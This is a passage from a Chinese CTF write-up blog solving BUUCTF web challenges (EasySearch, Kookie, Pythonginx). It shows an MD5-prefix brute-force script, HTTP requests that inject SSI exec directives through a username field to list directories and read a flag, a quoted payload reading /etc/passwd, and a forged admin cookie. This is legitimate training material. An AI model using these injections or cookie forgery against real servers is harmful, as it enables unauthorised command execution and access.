invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">73</span>)] . <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">73</span>)]; <span class="comment">//Random 5 times</span></span><br><span class="line">    <span class="comment"># uniqid()：返回唯一标识符，且是基于当前时间和微秒数。</span></span><br><span class="line">    <span class="comment"># content是唯一标识符和随机字符串拼接的结果</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$random</span>;</span><br><span class="line">    <span class="comment">// 返回$content的哈希值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制数据包类型</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存在检测</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment"># 默认值（静态）</span></span><br><span class="line">    <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">    <span class="comment"># $admin 和传入的密码的 md5加密值 的 前六位相等</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="number">0</span>, <span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建文件路径，get_hash()是唯一标识符函数。</span></span><br><span class="line">        <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span> . <span class="title function_ invoke__">get_hash</span>() . <span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">        <span class="comment"># 以写入为主，打开这个文件。</span></span><br><span class="line">        <span class="comment"># 当文件无法打开时，转到die终止程序。</span></span><br><span class="line">        <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">        <span class="comment"># 得到用户名拼接的特殊字符串，部分被掩饰无法观察，可能带上了flag</span></span><br><span class="line">        <span class="variable">$text</span> = <span class="string">&#x27;******&lt;h1&gt;Hello,&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;******&#x27;</span>;</span><br><span class="line">        <span class="comment"># 写入文件当中，并且关闭文件</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>, <span class="variable">$text</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">        <span class="comment"># 表示程序结束</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># 某些源码不可见</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我想读取flag，或者文件目录，应该从哪下手？</p>
<p>第一个需要跨越的障碍：md5字符串的截取问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="number">0</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p>第二个需要跨越的障碍: 路径文件是否存在的问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span> . <span class="title function_ invoke__">get_hash</span>() . <span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line"><span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="comment"># w模式是强行创建新文件并且写入，这个or后面的语句是基于无法打开文件的情况存在的，与当下状况有些相悖。</span></span><br></pre></td></tr></table></figure>

<p>仔细一想，第一个障碍可以尝试自己生成来解决，而第二个，则可以尝试历史生成解决。但是么……有一个非常重要的条件，就是你的password经过认证后就会回显它的URL路径信息了哇……<br>也就是说，这第二个障碍压根不存在……</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000000</span>):</span><br><span class="line">    admin = <span class="string">&#x27;6d0bc1&#x27;</span></span><br><span class="line">    <span class="comment"># $admin 和传入的密码的 md5加密值 的 前六位相等</span></span><br><span class="line">    hash_num = hashlib.md5()</span><br><span class="line">    hash_num.update(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># print(hash_num.hexdigest())</span></span><br><span class="line">    <span class="keyword">if</span> admin == hash_num.hexdigest()[<span class="number">0</span>:<span class="number">6</span>]:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#得到2020666</span></span><br></pre></td></tr></table></figure>

<p>得到对应的数字后，可以试试成功与否</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">03365</span>da0-<span class="number">1</span>edf-<span class="number">4871</span>-a316-f33997a80e63.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">117.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 37</span></span><br><span class="line"><span class="comment">Origin: http://03365da0-1edf-4871-a316-f33997a80e63.node4.buuoj.cn:81</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://03365da0-1edf-4871-a316-f33997a80e63.node4.buuoj.cn:81/index.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=username%27&amp;password=2020666</span></span><br></pre></td></tr></table></figure>

<p>悠着点哦，password的数字后面是没有任何字符串的。之前做的时候以为是用来标识为utf8编码的，后来试了几十次才发现那根本就是故意匡我的。数字后面根本不需要什么标识符。可能是我个人手误吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面是返回包的内容</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Sun, <span class="number">17</span> Sep <span class="number">2023</span> <span class="number">12</span>:<span class="number">18</span>:<span class="number">18</span> GMT</span><br><span class="line">Content-Type: text/html;charset=utf-<span class="number">8</span></span><br><span class="line">Content-Length: <span class="number">568</span></span><br><span class="line">Connection: close</span><br><span class="line">Url_is_here: <span class="keyword">public</span>/<span class="number">89477</span>d6c1ea3d94cd236804def18384a1d4a0ac3.shtml</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.1</span>.<span class="number">27</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;public/css/base.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;public/css/login.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;[+] Welcome to manage system&#x27;</span>)&lt;/script&gt;[!] Header  error ...            &lt;div id=<span class="string">&quot;tip&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">foot</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    <span class="title">bjd</span>.<span class="title">cn</span></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>返回包不仅给出了你需要的URL，甚至还回显了用户名。用户名是一个回显点，也是一个注点。但要怎么注呢？</p>
<p>说实在，给出下面这个路径给我们访问我是真的没想到。</p>
<p>为了解读源码，那时间浪费的有点严重哇……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>/<span class="number">89477</span>d6c1ea3d94cd236804def18384a1d4a0ac3.shtml</span><br><span class="line">之前遇到的SSTI有明显的&#123;&#123;&#125;&#125;特征，结果这次插入&#123;&#123;&#125;&#125;后给我原原本本的返回来了。试了几次都无效，说明漏洞点不在这个知识点。</span><br><span class="line"></span><br><span class="line">这个题目根据大佬WP，此处用到的是SSI。原因是因为这个返回的文件使用的Shtml格式文件。</span><br></pre></td></tr></table></figure>



<p>网上查了下相关的shtml的资料，得到的是下面这些：</p>
<p>这里摘录下SSI语法：(具体的摘录来源<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/120183443?ops_request_misc=&request_id=&biz_id=102&utm_term=%5BBJDCTF2020%5DEasySearch&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-120183443.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4187">点我</a>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SSI语法</span><br><span class="line"></span><br><span class="line">SHTML文件中使用SSI指令引用其他的html文件（<span class="comment">#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.显示服务器端环境变量&lt;<span class="comment">#echo&gt;</span></span><br><span class="line">&lt;!–<span class="comment">#echo var=&quot;DOCUMENT_NAME&quot;–&gt;		//本文档名称</span></span><br><span class="line">&lt;!–<span class="comment">#echo var=&quot;DATE_LOCAL&quot;–&gt;		//现在时间</span></span><br><span class="line">&lt;! <span class="comment">#echo var=&quot;REMOTE_ADDR&quot;–&gt;		//显示IP地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.将文本内容直接插入到文档中&lt;<span class="comment">#include&gt;</span></span><br><span class="line">&lt;! <span class="comment">#include file=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual=&quot;index.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;! <span class="comment">#include virtual=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual=&quot;/www/footer.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.显示WEB文档相关信息&lt;<span class="comment">#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</span></span><br><span class="line">&lt;! <span class="comment">#flastmod file=&quot;文件名称&quot;–&gt;		//文件最近更新日期</span></span><br><span class="line">&lt;!–<span class="comment">#fsize file=&quot;文件名称&quot;–&gt;		//文件的长度</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.直接执行服务器上的各种程序&lt;<span class="comment">#exec&gt;(如CGI或其他可执行程序)</span></span><br><span class="line">&lt;!–<span class="comment">#exec cmd=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!–<span class="comment">#exec cgi=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试进行命令执行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面是登录和访问的组合,且只截取关键信息：</span></span><br><span class="line">GET: /index.php</span><br><span class="line">POST: username=&lt;!--<span class="comment">#exec cmd=&quot;ls&quot;--&gt;&amp;password=2020666</span></span><br><span class="line"><span class="keyword">return</span>: Url_is_here: /<span class="keyword">public</span>/<span class="number">6</span>c051d83afa3316d4a2424e42ee2f6ec4e5fa983.shtml</span><br><span class="line">    </span><br><span class="line">GET: /<span class="keyword">public</span>/<span class="number">6</span>c051d83afa3316d4a2424e42ee2f6ec4e5fa983.shtml</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line"><span class="number">269</span>c770854350d82db9e89bcc2b74715f0a96b6f.shtml</span><br><span class="line"><span class="number">2</span>b88015534a75975d2f8f95ba084719b8274e017.shtml</span><br><span class="line"><span class="number">3302438</span>afa907b9aa614d73ad2694b92866b7c06.shtml</span><br><span class="line"><span class="number">3338</span>dcea2346d456527316503de582e136c25476.shtml</span><br><span class="line"><span class="number">462</span>ad7b3f27588373c66be19b7743e24329fb62e.shtml</span><br><span class="line"><span class="number">4832698852</span>f8f52d76e7e6f1eb69ea7ca22aea74.shtml</span><br><span class="line"><span class="number">4e7</span>f05ec199f63667038ffdeddea53c2d2f639a9.shtml</span><br><span class="line"><span class="number">5</span>be67cb14a7873f7db9bbbb85fa6bb63ec586ac1.shtml</span><br><span class="line"><span class="number">5</span>c18f23485bc4b4089a6b955ce97fbe63957e0d9.shtml</span><br><span class="line"><span class="number">6</span>c051d83afa3316d4a2424e42ee2f6ec4e5fa983.shtml</span><br><span class="line"><span class="number">79e08579</span>dc072805ad10e591e90033af8aa16ff0.shtml</span><br><span class="line"><span class="number">7</span>d18f0c4430d10af80a08d606750dfa831ea9443.shtml</span><br><span class="line"><span class="number">84</span>a8d94e808267e28ce8c8caf975c86f53d4cfaf.shtml</span><br><span class="line"><span class="number">86919</span>bd890c1e69dee60ebc985df7b2a353fc3e5.shtml</span><br><span class="line">a05d058a9c759f8dd06fac9a6b9d06246b4ed759.shtml</span><br><span class="line">bfc2f287e3213c54f5cb90c2df4007305db4ac0a.shtml</span><br><span class="line">c28ede2a2ff0e21643a1c6604cc2d1a216a48211.shtml</span><br><span class="line">ca9ac3b902909d7ec631399cd928603c33f668f5.shtml</span><br><span class="line">css</span><br><span class="line">e094e1247c44f2212aa221bacbcedf8f393750ad.shtml</span><br><span class="line">e320da6214cd5c8854a6656bcf0ca6223b223b57.shtml</span><br><span class="line">images</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">GET: /index.php</span><br><span class="line">POST: username=&lt;!--<span class="comment">#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=2020666</span></span><br><span class="line"><span class="keyword">return</span>: Url_is_here: /<span class="keyword">public</span>/b5dc11f405d4632285bcaa9bc2e3329929446166.shtml</span><br><span class="line">    </span><br><span class="line">GET: /<span class="keyword">public</span>/b5dc11f405d4632285bcaa9bc2e3329929446166.shtml</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">flag_990c66bf85a09c664f0b6741840499b2</span><br><span class="line">index.php</span><br><span class="line">index.php.swp</span><br><span class="line"><span class="keyword">public</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终的WP</span></span><br><span class="line">GET: /index.php</span><br><span class="line">POST: username=&lt;!--<span class="comment">#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</span></span><br><span class="line"><span class="keyword">return</span>: Url_is_here: /<span class="keyword">public</span>/<span class="number">779</span>afa927fe057a649d7df679526e45587adb4c9.shtml</span><br><span class="line">    </span><br><span class="line">GET: /<span class="keyword">public</span>/<span class="number">779</span>afa927fe057a649d7df679526e45587adb4c9.shtml</span><br><span class="line"><span class="keyword">return</span>:  flag&#123;e249427f-cfc2-<span class="number">4</span>d75-<span class="number">8</span>d7c-a73be6ecf05a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>学习了什么是shtml，以及对应的SSI注入。<br>C站找资源，有的不起眼的搜索列表下下下面的文章，或许就是小白眼中最宝贵的宝藏。因为有些博文永远简短，最适合的是大佬，并不是想要学习的小白想见到的。</p>
<h1 id="BSidesCF-2019-Kookie-1"><a href="#BSidesCF-2019-Kookie-1" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><h2 id="原始信息-26"><a href="#原始信息-26" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Can you log in?<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    Log in as <span class="tag">&lt;<span class="name">tt</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">tt</span>&gt;</span>!</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    We found the account <span class="tag">&lt;<span class="name">tt</span>&gt;</span>cookie<span class="tag">&lt;/<span class="name">tt</span>&gt;</span> / <span class="tag">&lt;<span class="name">tt</span>&gt;</span>monster<span class="tag">&lt;/<span class="name">tt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;challenge rounded&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;messagebox&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-warning&quot;</span> <span class="attr">role</span>=<span class="string">&quot;alert&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Invalid username or password!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&#x27;GET&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;action&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;login&#x27;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Enter your password below!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;name&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;username&#x27;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Log in!&#x27;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">提取的信息：</span><br><span class="line">1.登录到admin</span><br><span class="line">2.使用cookie登录</span><br><span class="line">3.登录的用户名和密码的&quot;name&quot;分username和password</span><br></pre></td></tr></table></figure>



<h2 id="解题-26"><a href="#解题-26" class="headerlink" title="解题"></a>解题</h2><p>1.尝试弱口令爆破，无法爆破。</p>
<p>2.根据cookie提示，思考构造cookie假身份认证的方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Cookie: username=admin</span><br><span class="line">hackbar加上cookie后直接发送登录，获得如下结果：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-info&quot;</span> <span class="attr">role</span>=<span class="string">&quot;alert&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Congratulations! You&#x27;re logged in as </span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&#x27;highlight&#x27;</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        ! Your flag is: </span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&#x27;highlight&#x27;</span>&gt;</span></span><br><span class="line">            flag&#123;6989dc42-4fa8-42bd-9dc6-1f255711188a&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><h2 id="原始信息-27"><a href="#原始信息-27" class="headerlink" title="原始信息"></a>原始信息</h2><p>题目信息拆解：Python,nginx</p>
<p>一个ping框，一个python源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;GET&quot;</span> action=<span class="string">&quot;getUrl&quot;</span>&gt;</span><br><span class="line">        URL:&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;url&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;code&gt;</span><br><span class="line">        </span><br><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>看懂了，但又不完全看懂。</p>
<h2 id="解题-27"><a href="#解题-27" class="headerlink" title="解题"></a>解题</h2><p>NGINX相关配置文件位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">配置文件存放目录： /etc/nginx</span><br><span class="line">主配置文件：		/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：		/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：			  /usr/lisb64/nginx/modules</span><br><span class="line">应用程序：		/usr/sbin/nginx</span><br><span class="line">程序默认存放位置： /usr/share/nginx/html</span><br><span class="line">日志默认存放位置： /<span class="keyword">var</span>/log/nginx</span><br><span class="line">配置文件目录为：  /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p>取出Python源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    <span class="comment"># 假设传入的是:http://xxx.com/path/</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="comment"># xxx.com</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line"></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    <span class="comment"># [&#x27;http&#x27;, 